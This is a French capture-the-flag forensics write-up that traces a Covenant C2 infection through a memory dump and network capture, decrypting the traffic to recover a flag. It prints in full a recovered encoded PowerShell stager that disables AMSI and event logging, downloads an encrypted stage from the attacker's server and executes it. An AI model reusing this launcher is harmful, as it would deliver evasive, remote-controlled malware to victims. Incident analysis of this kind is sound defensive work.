Victime:
-fichier FLAG
-e mail 
- wireshark
- dumpit

VICT ouvre le mail
enregistre la pj, l execute
ATK
VICT ouvre le fichier chiffré.

enregistrement wireshark puis fichier de vidage de powershell puis dumpit

Write-up:
DMP:
- vérifier que le fichier présent est bien recouvrable: OK on a le flag avec VOL3
- vérifier la présence du payload powershell pour lancer le processus malveillant:

vérifier que le fichier présent est bien recouvrable: OK on a le flag avec VOL3:
$ python3 volatility3/vol.py -f DESKTOP-QIIFSTT-20250317-233413.dmp windows.filescan.FileScan > filescan.txt 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ cat filescan.txt| grep FLAG
0xd2821dad0230  \Users\John Freguer\Desktop\FLAG.sith
0xd28224321ec0  \Users\John Freguer\AppData\Roaming\Microsoft\Windows\Recent\FLAG.sith.lnk
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 volatility3/vol.py -f DESKTOP-QIIFSTT-20250317-233413.dmp windows.dumpfiles.DumpFiles --virtaddr 0xd2821dad0230
Volatility 3 Framework 2.24.0
Progress:  100.00               PDB scanning finished                                
Cache   FileObject      FileName        Result

DataSectionObject       0xd2821dad0230  FLAG.sith       file.0xd2821dad0230.0xd2822542a0d0.DataSectionObject.FLAG.sith.dat
=> decipher powershell puis base63 decode avec cyberchef
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
- vérifier la présence du payload powershell pour lancer le processus malveillant:
$ python3 volatility3/vol.py -f DESKTOP-QIIFSTT-20250317-233413.dmp windows.cmdline.CmdLine 
4644    powershell.exe  powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABNAEEATQB3AEEANgBBAEQAZwBBAE0AQQBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwA1AGQANAAxADQAMAAyAGEAYgBjADQAYgAyAGEANwA2AGIAOQA3ADEAOQBkADkAMQAxADAAMQA3AGMANQA5ADIAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEUAQwBQAFYAeQBrAEcAbABuAEUAPQBzAHcAeQAzAE8ATgAxACsAYwBVAHgANwAvADEARwBhADcAVQAwAGkAYgBaAEgAbgBPAEcAWQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
=> un base64 -d nous donne la clef : 5d41402abc4b2a76b9719d911017c592
=> avec cette clef + paquet 3320 POST /news.php (hexstream)+ SCRIPT public_key_recover.py :
[+] Modulus: 26446326989608295082060864712736612765719955303654619347367989562212120151969292075912397456280118086284348255589109131761496641692391243949260647584978462946896513754362699501700802516984666449310935987884872157727639278574319080626174792778988486229092789767890772234367545838664771528814432958134078548009555871126717794627528355447379088034908871180238405606713636738706089382908846867462914772497891711938058022250603830737523539021940142709793756978671486550193351784970214701296448527901938210650951519339916805184279701110783573007405260522915597959593991968879108259321584336608668253777084757392499296001253 
=> avec le modulus je lance le script de naacbin contre le dump powershell:
$ python3 CovenantDecryptor/extract_privatekey.py -i powershell.DMP -m 26446326989608295082060864712736612765719955303654619347367989562212120151969292075912397456280118086284348255589109131761496641692391243949260647584978462946896513754362699501700802516984666449310935987884872157727639278574319080626174792778988486229092789767890772234367545838664771528814432958134078548009555871126717794627528355447379088034908871180238405606713636738706089382908846867462914772497891711938058022250603830737523539021940142709793756978671486550193351784970214701296448527901938210650951519339916805184279701110783573007405260522915597959593991968879108259321584336608668253777084757392499296001253 -o .
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[+] Saved private key /home/kali/Downloads/privkey1.pem => privatekey OK
=> avec la privatekey + paquet (réponse 3320) 330 + SCRIPT packet_decipher_to_session_key.py => on retrouve la session key :
[+] Nonce : b'6241119453105301'
[+] Session Key : 787a3b675d792523406452217e3c5924266a745c4c496542362a3e4f3039443a

----------------------------------------------------
WHOAMI, packet 3849:
https://gchq.github.io/CyberChef/#recipe=From_Hex('None')Drop_bytes(0,20,false)AES_Decrypt(%7B'option':'Hex','string':'787a3b675d792523406452217e3c5924266a745c4c496542362a3e4f3039443a'%7D,%7B'option':'Hex','string':'e7f8f173b642a67f81baa27e240fe3ad'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=Yzk1YTdmYjZjZmQ1YmZjNTFkZGU2OWI4YmE3ZDMyMjVkMWUwMTI1NWU3ZjhmMTczYjY0MmE2N2Y4MWJhYTI3ZTI0MGZlM2FkMmRmMWRjMzUzYWRkMGMzY2MzMjdiNDA2ZjkwM2Q5ZTNjM2Y1NzM4ZTQ5NzEyYTU2NTkyMWI1MWQ2NjZmOTEyNQ

PS, packet 3571
https://gchq.github.io/CyberChef/#recipe=From_Hex('None')Drop_bytes(0,20,false)AES_Decrypt(%7B'option':'Hex','string':'787a3b675d792523406452217e3c5924266a745c4c496542362a3e4f3039443a'%7D,%7B'option':'Hex','string':'f9424163a641396c94328afd117ab163'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=Mjg5NTVhY2NmMGJiZmU1MDM2NzJjN2NmMmQ3MjhhZTBlZTc5MDdiZmY5NDI0MTYzYTY0MTM5NmM5NDMyOGFmZDExN2FiMTYzOThlMDJhZDZhYmUwMzNiOGEyZjQzYjI3MzE3MTc3MDU

PAYLOAD, packet 3957
https://gchq.github.io/CyberChef/#recipe=From_Hex('None')Drop_bytes(0,20,false)AES_Decrypt(%7B'option':'Hex','string':'787a3b675d792523406452217e3c5924266a745c4c496542362a3e4f3039443a'%7D,%7B'option':'Hex','string':'9cb4525dfb2997e8c6fa48152f68cb29'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=YmZlMzVjNjMwMmU0ZjZhYTVjNzYxOTQyZjU5ZjQ0N2RiNzIwZmE1MTljYjQ1MjVkZmIyOTk3ZThjNmZhNDgxNTJmNjhjYjI5M2U2ZDJhNzRmNGQ2MDE2NTFlYTU1NjczZDQyZjM5MDNjZTc2ZGI3YjVmMWU2OWI5MmVlODNmMjBhMTBkMmQ3Yzc2NTdkYTc0NDQwM2FlMzhiNTk2ODk5OTgyZTIxNzhlNmJiYTQ5N2NkMmRlOWFhZmVjN2RhM2YwNjIxM2Y1ZGU0Njc2MWIwYWFlMzJmNzM3ODc4ZWIwMjBjNjQzOTc4N2U1ODk5NjU1NDcxODZiMzMxN2Y1MjEyYzMxMzBiNThlMzU5ZGE0Y2Q4MjM1ZDJjNjYyNzFjOGQxZGM2Y2E5YTNiMGQ0N2FlMTk1YTViNzhhMWY3YjkzMTI3NzY0MTk0MmRjZDc0YjBmOWE0ZDEzYmY1ODk4MTIyMmY3NTQ3NGFmYjgyNmQ5ODM1OTE4NTQ2YTM2NmI4ZGM3ODM5YTM2MzQ5MGNjMjcxNmY3MWE0ZTg3NGIwMmEwZDNmMjUyOTU5MGMzNTY4OTk2ZmU1NDc3YTlhZjViMWYxNGI4NDdkNjYwYmI0ZTlmN2EzNTA2NDJlMDFjMzgyNjBjODc3ZDBkOTE2ZmYwYmQ4ZjRiNzRiMGY2OTgwZjQ0OWU2NmNhMjNjOGVjNmQzODc2YjQ5ZTg1MGUwNTgxMDI0YWIwMGE1NDNiMmNiNmQyZTM2YTdlZGU0MjcyNmE3MzY1YmM5NWY0MWE2N2RiOGJlNmM4MWE0Yjc0ZjA4M2NjZDNiYTUwNGQzZjdmNDcwNDMzZjhlYzJlNDAzZmZjOTdmY2YxYzRjZGJhMDBmNTAxNmJmYzg2ZjRlN2EzYzAwY2JkM2FkZDY2ZTFmMTE5ZmFlOTFlNzIzOTEyZTExYmM4MzRkMThkOTBlMmVhYWFhYTYzNTcxN2ZhOGJjOGM4NGE2NjAyM2U0NjM5YzBiN2VlYzk0MWE2NGNiODJiMTBkN2I5OTcyNDZiYmQ2YzEzMTY4MjJiYjEwNDRkZjY5OWE3YTAzZmY3ZjRmYjc0ZTA3ZDM2MjViMTJkMTQxNWQyNjY2Y2M5N2Y1ZTA0NmE5MzllMjI4ODNlNjBlNzhiMzdkMTJjOTg1MDkwOWVlYTdjNDA5NjBhZjE4YjJmYjM4MmUyMTZiM2UwMDdhNGNlZWYxYmJjMDgwMmI1NzgyOTUxYTU2NWFhYTJiY2UwOGU1OTBlYTJlZGFjNzQxMTY0NzA5NDJhNjk5MGE5ZDY5ZWRjZTc5OWQyMmNjNGU3N2RlZDY0YTgwZjBkNzk3NTZiY2Y3MDg3M2Q5M2Q0NTJmZmEzOTk3ZmYzNTllZDk5ZGM4ZDNmOWNkYjk4Y2NiYzdlZjRhNWMyMmEzODY2ZWYyYzQ4YjRhOTY1YzRjYmZhOTEzMDc0NjA2ZTkwZTM2NjBkMWZjODkyYzliNzY0N2Y3OTM5MjRkZDdmZTVhZGYz

Les réponses peuvent être déchiffrées grâce au SCRIPT:packet_decipher_with_session_key.py, en extrayant les objets HTTP depuis wireshark
Il faut reverse le payload pour déchiffrer FLAG.sith



FLAG: RETRO{?mAy_t+h+e_F0Rce_b-e_with_yOU!}



















